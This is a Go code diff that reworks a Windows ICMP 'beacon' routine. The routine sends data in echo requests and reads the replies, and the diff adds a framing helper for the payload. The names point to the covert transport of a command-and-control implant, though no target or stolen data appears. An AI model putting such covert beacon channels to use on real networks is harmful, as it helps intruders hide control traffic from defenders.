@@ -61,25 +61,31 @@ func sendICMPBeacon(body []byte) []byte {
 	}
 	defer procIcmpCloseHandle.Call(h)
 
-	replyBuf := make([]byte, 8+len(body)+64)
-	var replyPtr uintptr
-	if len(replyBuf) > 0 {
-		replyPtr = uintptr(unsafe.Pointer(&replyBuf[0]))
-	}
+	dest := binary.LittleEndian.Uint32(addr[:])
+	return sendICMPBeaconFramed(body, func(payload []byte, seq int) []byte {
+		return icmpWindowsEcho(h, dest, addr, payload)
+	})
+}
 
+func icmpWindowsEcho(h uintptr, dest uint32, addr [4]byte, payload []byte) []byte {
+	if len(payload) == 0 {
+		return nil
+	}
+	replyBuf := make([]byte, 64+len(payload)+256)
 	ret, _, _ := procIcmpSendEcho.Call(
 		h,
-		uintptr(binary.LittleEndian.Uint32(addr[:])),
-		uintptr(unsafe.Pointer(&body[0])),
-		uintptr(len(body)),
+		uintptr(dest),
+		uintptr(unsafe.Pointer(&payload[0])),
+		uintptr(len(payload)),
 		0,
 		0,
-		replyPtr,
+		uintptr(unsafe.Pointer(&replyBuf[0])),
 		uintptr(len(replyBuf)),
 		5000,
 	)
-
-	_ = ret
+	if ret == 0 {
+		return nil
+	}
 	if len(replyBuf) < 8 {
 		return nil
 	}
@@ -87,8 +93,6 @@ func sendICMPBeacon(body []byte) []byte {
 	if status != 0 {
 		return nil
 	}
-	// Reject replies that did not originate from the requested destination so a
-	// spoofed Echo Reply cannot inject a response from an arbitrary host.
 	if replyBuf[0] != addr[0] || replyBuf[1] != addr[1] || replyBuf[2] != addr[2] || replyBuf[3] != addr[3] {
 		return nil
 	}
